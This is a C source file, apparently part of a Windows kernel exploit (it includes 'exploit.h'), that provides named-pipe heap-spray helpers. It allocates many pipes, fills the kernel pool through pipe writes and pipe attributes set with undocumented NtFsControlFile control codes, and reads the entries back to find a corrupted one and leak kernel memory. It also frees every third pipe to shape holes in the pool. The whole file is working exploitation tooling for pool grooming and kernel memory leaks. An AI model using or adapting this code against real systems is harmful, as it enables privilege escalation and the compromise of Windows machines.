#include <stdio.h>
#include <windows.h>
#include <ntstatus.h>
#include <stdint.h>
#include <winternl.h>

#include "Ioctl.h"

#include "pipe_utils.h"
#include "exploit.h"
#include "utils.h"

NTSTATUS
NTAPI
NtFsControlFile(
	_In_ HANDLE FileHandle,
	_In_opt_ HANDLE Event,
	_In_opt_ PIO_APC_ROUTINE ApcRoutine,
	_In_opt_ PVOID ApcContext,
	_Out_ PIO_STATUS_BLOCK IoStatusBlock,
	_In_ ULONG FsControlCode,
	_In_reads_bytes_opt_(InputBufferLength) PVOID InputBuffer,
	_In_ ULONG InputBufferLength,
	_Out_writes_bytes_opt_(OutputBufferLength) PVOID OutputBuffer,
	_In_ ULONG OutputBufferLength
);

int prepare_pipe(size_t bufsize, pipe_pair_t * pipe_pair)
{
	BOOL res = FALSE;

	// Write the data in user space buffer

	// Creating the pipe to kernel space
	res = CreatePipe(
		&pipe_pair->read,
		&pipe_pair->write,
		NULL,
		bufsize);

	if (res == FALSE)
	{
		printf("[!] Failed creating Pipe\r\n");
		return 0;
	}
    return 1;
}


pipe_spray_t * prepare_pipes(size_t nb, size_t size, char * data, spray_type_t type)
{
    pipe_spray_t * pipe_spray = malloc(sizeof(pipe_spray_t) + (nb * sizeof(pipe_pair_t)));
    char * data_buf = malloc(size + 1);
    size_t pipe_size;

    memcpy(data_buf, data, size);
    data_buf[size] = 0;

    pipe_spray->data_buf = data_buf;
    pipe_spray->nb = nb;
    pipe_spray->type = type;

    if (type == SPRAY_PIPE_QUEUE_ENTRY)
    {
        pipe_spray->bufsize = size - 0x40;
        pipe_size = pipe_spray->bufsize;
    }
    else if (type == SPRAY_PIPE_ATTRIBUTE)
    {
        pipe_spray->bufsize = size - 0x38;
        /* Should be big enough to avoid write lock */
        pipe_size = 0x10000;
    }
    else
    {
        fprintf(stderr, "[-] Unknown spray type %d !\n", type);
        exit(0);
    }

    if (!pipe_spray)
    {
        fprintf(stderr, "[-] Failed to alloc pipe spray !\n");
        exit(0);
    }
    for (size_t i = 0; i < pipe_spray->nb; i++)
    {
        if (!prepare_pipe(pipe_size, &pipe_spray->pipes[i]))
        {
            fprintf(stderr, "[-] Failed to alloc one pipe !\n");
            exit(0);
        }
    }
    return pipe_spray;
}

int spray_pipes(pipe_spray_t * pipe_spray)
{
    spray_type_t type = pipe_spray->type;

    for (size_t i = 0; i < pipe_spray->nb; i++)
    {
        if (type == SPRAY_PIPE_QUEUE_ENTRY)
        {
            if (!write_pipe(&pipe_spray->pipes[i], pipe_spray->data_buf, pipe_spray->bufsize))
            {
                fprintf(stderr, "[-] Failed to write in pipe at index %d !\n", i);
                return 0;
            }
        }
        else if (type == SPRAY_PIPE_ATTRIBUTE)
        {
            if (!set_pipe_attribute(&pipe_spray->pipes[i], pipe_spray->data_buf, pipe_spray->bufsize))
            {
                fprintf(stderr, "[-] Failed to set pipe attribute at index %d !\n", i);
                return 0;
            }
        }
        else
        {
            fprintf(stderr, "[-] Unknown spray type %d !\n", type);
            return 0;
        }
    }
    return 1;
}

int write_pipe(pipe_pair_t * pipe_pair, char * data, size_t bufsize)
{
    BOOL res = FALSE;
    DWORD resultLength = 0;

	res = WriteFile(
        pipe_pair->write,
        data,
        bufsize,
        &resultLength,
        NULL);

	if (res == FALSE)
	{
		printf("[-] Failed writing to pipe with error %d !\n", GetLastError());
        return 0;
	}
    return 1;
}

int read_pipe(pipe_pair_t * pipe_pair, char * out, size_t bufsize)
{
    BOOL res = FALSE;
    DWORD resultLength = 0;

	res = ReadFile(
        pipe_pair->read,
        out,
        bufsize,
        &resultLength,
        NULL);

	if (res == FALSE)
	{
		printf("[-] Failed reading from Pipe\r\n");
        return 0;
	}
    return 1;
}


/**
 * Create a pipe attribute on target_pipe.
 * The allocation will be of size (size + 0x30)
 * 
**/
int set_pipe_attribute(pipe_pair_t *target_pipe, char * data, size_t size)
{
    IO_STATUS_BLOCK status;
    char output[0x100];

    memset(output, 0x42, 0xff);

    NtFsControlFile(target_pipe->write, 
        NULL,
        NULL,
        NULL,
        &status,
        0x11003C, //0x11002C for arg of set attribute is 2
        data,
        size,
        output,
        sizeof(output)
        );
    return 1;
}

/**
 * Create a pipe attribute on target_pipe.
 * The allocation will be of size (size + 0x30)
 * 
**/
int get_pipe_attribute(pipe_pair_t *target_pipe, char * out, size_t size)
{
    IO_STATUS_BLOCK status;
    NTSTATUS st;
    char input[ATTRIBUTE_NAME_LEN] = ATTRIBUTE_NAME;

    st = NtFsControlFile(target_pipe->write, 
        NULL,
        NULL,
        NULL,
        &status,
        0x110038,
        input,
        ATTRIBUTE_NAME_LEN,
        out,
        size
        );

    if (!NT_SUCCESS(st)) {
        fprintf(stderr, "[-]NtFsControlFile failed !");
        return 0;
    }

    return 1;
}


int read_pipes(pipe_spray_t * pipe_spray, char * leak)
{
    char buf[0x10000] = {0};
    spray_type_t type = pipe_spray->type;


    for (size_t i = 0; i < pipe_spray->nb; i++)
    {
        if (type == SPRAY_PIPE_QUEUE_ENTRY)
        {
            // Dont read everything so the entry is not deleted ?
            size_t read_size = LEN_OF_PIPE_QUEUE_ENTRY_STRUCT + POOL_HEADER_SIZE;

            if (!read_pipe(&pipe_spray->pipes[i], buf, read_size))
            {
                fprintf(stderr, "[-] Failed to alloc one pipe !");
                exit(0);
            }
            if (memcmp((char *)pipe_spray->data_buf, buf, read_size))
            {
                printf("[+] read_pipe -> One of the buf returned a different input !\n");
                memcpy(leak, buf, read_size);
                return i;
            }
        }
        else if (type == SPRAY_PIPE_ATTRIBUTE)
        {
            if (!get_pipe_attribute(&pipe_spray->pipes[i], buf, pipe_spray->bufsize))
            {
                fprintf(stderr, "[-] Failed to get pipe attribute !");
                exit(0);
            }
            if (memcmp(pipe_spray->data_buf + ATTRIBUTE_NAME_LEN, buf, pipe_spray->bufsize - (ATTRIBUTE_NAME_LEN)))
            {
                //hexdump(pipe_spray->data_buf, pipe_spray->bufsize);
                printf("[+] get_pipe_attribute -> One of the buf returned a different input !\n");
                //hexdump(buf, pipe_spray->bufsize);
                memcpy(leak, buf, pipe_spray->bufsize - (ATTRIBUTE_NAME_LEN));
                return i;
            }
        }
        else
        {
            fprintf(stderr, "[-] Unknown spray type %d !\n", type);
            exit(0);
        }
    }
    return -1;
}

int close_pipe(pipe_pair_t * pipe_pair)
{
    if (!CloseHandle(pipe_pair->write))
    {
        fprintf(stderr, "[-] Failed to close write pipe !\n");
        return 0;
    }
    if (!CloseHandle(pipe_pair->read))
    {
        fprintf(stderr, "[-] Failed to close read pipe !\n");
        return 0;
    }
    return 1;
}


void free_pipes(pipe_spray_t * pipe_spray)
{
    for (size_t i = 0; i < pipe_spray->nb; i++)
    {
        close_pipe(&pipe_spray->pipes[i]);
    }
    free(pipe_spray->data_buf);
    free(pipe_spray);
}

void free_third_pipes(pipe_spray_t *pipe_spray, int start)
{
    for (size_t i = start; i < pipe_spray->nb; i += 3)
    {
        close_pipe(&pipe_spray->pipes[i]);
    }
}
